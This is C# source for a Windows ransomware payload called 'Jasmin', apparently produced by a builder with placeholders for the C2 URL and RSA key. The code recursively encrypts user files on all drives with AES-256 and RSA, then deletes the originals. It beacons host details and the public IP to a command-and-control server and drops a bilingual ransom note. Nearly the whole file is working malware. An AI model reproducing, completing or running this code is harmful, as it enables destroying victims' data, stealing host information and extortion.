// Jasmin Windows Payload — Auto-generated
// Compile: csc /target:winexe /out:payload.exe this_file.cs
using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Threading;
using System.Collections.Generic;
using System.Management;

namespace JasminPayload {
class P {
static string C2="{{C2_URL}}";
static string SECRET="{{HANDSHAKE}}";
static string PUB=@"{{RSA_PUBLIC_KEY}}";

static string[] SKIP_DIRS={@"\Windows",@"\Program Files",@"\Program Files (x86)",
  @"\ProgramData",@"\$Recycle.Bin",@"\System Volume Information",
  @"\Recovery",@"\Boot",@"\EFI"};
static HashSet<string> SKIP_EXT=new HashSet<string>(StringComparer.OrdinalIgnoreCase){
  ".sys",".dll",".exe",".msi",".drv",".ini",".lnk",".bat",".cmd",
  ".rdp",".msc",".cpl",".scr",".efi",".dat",".log",".reg",".mui"};
static string[] EXTS={"*.pptx","*.docx","*.xlsx","*.txt","*.pdf","*.csv",
  "*.jpg","*.jpeg","*.png","*.zip","*.rar","*.7z","*.mp3","*.mp4",
  "*.sql","*.bak","*.html","*.php","*.py","*.java","*.json","*.xml"};

static bool Skip(string p){
  string f=Path.GetFullPath(p);
  if(f.EndsWith(".jasmin",StringComparison.OrdinalIgnoreCase))return true;
  string r=Path.GetPathRoot(f)??@"C:\";
  foreach(var d in SKIP_DIRS)if(f.StartsWith(r+d.TrimStart('\\'),StringComparison.OrdinalIgnoreCase))return true;
  if(SKIP_EXT.Contains(Path.GetExtension(f)))return true;
  string n=Path.GetFileName(f);
  if(n.StartsWith("ntuser",StringComparison.OrdinalIgnoreCase)||n.Equals("bootmgr",StringComparison.OrdinalIgnoreCase))return true;
  return false;
}

static byte[] AesEnc(byte[] data,byte[] key,byte[] iv){
  using(var a=Aes.Create()){a.KeySize=256;a.Mode=CipherMode.CBC;a.Padding=PaddingMode.PKCS7;a.Key=key;a.IV=iv;
  using(var ms=new MemoryStream())using(var cs=new CryptoStream(ms,a.CreateEncryptor(),CryptoStreamMode.Write)){
  cs.Write(data,0,data.Length);cs.FlushFinalBlock();return ms.ToArray();}}}

static byte[] RsaEnc(byte[] data){
  using(var rsa=RSA.Create()){rsa.ImportFromPem(PUB);return rsa.Encrypt(data,RSAEncryptionPadding.OaepSHA256);}}

static void Enc(string path){
  try{
    if(Skip(path))return;
    byte[] p=File.ReadAllBytes(path);if(p.Length==0)return;
    byte[] h;using(var s=SHA256.Create())h=s.ComputeHash(p);
    byte[] k=new byte[32],iv=new byte[16];
    using(var rng=RandomNumberGenerator.Create()){rng.GetBytes(k);rng.GetBytes(iv);}
    byte[] ct=AesEnc(p,k,iv);
    byte[] km=new byte[48];Buffer.BlockCopy(k,0,km,0,32);Buffer.BlockCopy(iv,0,km,32,16);
    byte[] ek=RsaEnc(km);
    using(var fs=new FileStream(path+".jasmin",FileMode.Create)){
      fs.Write(h,0,32);fs.Write(ct,0,ct.Length);fs.Write(ek,0,ek.Length);
      fs.Write(BitConverter.GetBytes(ek.Length),0,4);}
    File.Delete(path);
  }catch{}}

static void Beacon(){
  try{
    string u=Environment.UserName,m=Environment.MachineName;
    string t=DateTime.Now.ToString("HH:mm:ss"),d=DateTime.Today.ToString("dd/MM/yyyy")+", "+DateTime.Now.DayOfWeek;
    string ip="0.0.0.0";try{ip=new WebClient().DownloadString("https://api.ipify.org");}catch{}
    string sid="";try{var mc=new ManagementClass("Win32_LogicalDisk");
      foreach(ManagementObject o in mc.GetInstances())sid+=Convert.ToString(o["VolumeSerialNumber"]);}catch{}
    var c=new HttpClient();
    var kv=new List<KeyValuePair<string,string>>{
      new("machine_name",m),new("computer_user",u),new("systemid",sid),
      new("os","Windows "+Environment.OSVersion.Version),new("date",d),new("time",t),
      new("ip",ip),new("location","?"),new("password","RSA_PROTECTED"),new("handshake",SECRET)};
    c.PostAsync(C2,new FormUrlEncodedContent(kv)).Wait();
  }catch{}}

static string SID="";
static string NOTE=@"
╔══════════════════════════════════════════════════╗
║       YOUR FILES HAVE BEEN ENCRYPTED             ║
║           你的文件已被加密                         ║
╚══════════════════════════════════════════════════╝

AES-256 + RSA-2048 军事级加密。 系统ID: {SID}

⚠️ 不要重命名/删除 .jasmin 文件，不要用第三方软件解密。

🔓 解密:
  【Windows】运行 Jasmin_Decryptor.exe → 选择.pem私钥 → Decrypt
  【Linux/macOS】pip3 install cryptography && python3 jasmin_decrypt.py key.pem

✅ SHA-256 校验确保文件100%还原
";

static void DropNotes(){
  string txt=NOTE.Replace("{SID}",SID);
  string[] dirs={
    Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)};
  foreach(string d in dirs){
    try{if(Directory.Exists(d))File.WriteAllText(Path.Combine(d,"READ_ME_解密教程.txt"),txt);}catch{}}
  foreach(DriveInfo dr in DriveInfo.GetDrives()){
    try{File.WriteAllText(dr.Name+"READ_ME_解密教程.txt",txt);}catch{}}
}

static void Main(){
  try{var mc=new ManagementClass("Win32_LogicalDisk");
    foreach(ManagementObject o in mc.GetInstances())SID+=Convert.ToString(o["VolumeSerialNumber"]);}catch{}
  Beacon();
  foreach(var dr in DriveInfo.GetDrives()){
    try{foreach(string ext in EXTS){
      try{foreach(string f in Directory.EnumerateFiles(dr.Name,ext,SearchOption.AllDirectories)){
        string fc=f;new Thread(()=>Enc(fc)){Priority=ThreadPriority.AboveNormal}.Start();
      }}catch{}}}catch{}}
  DropNotes();
}}} // end class, namespace
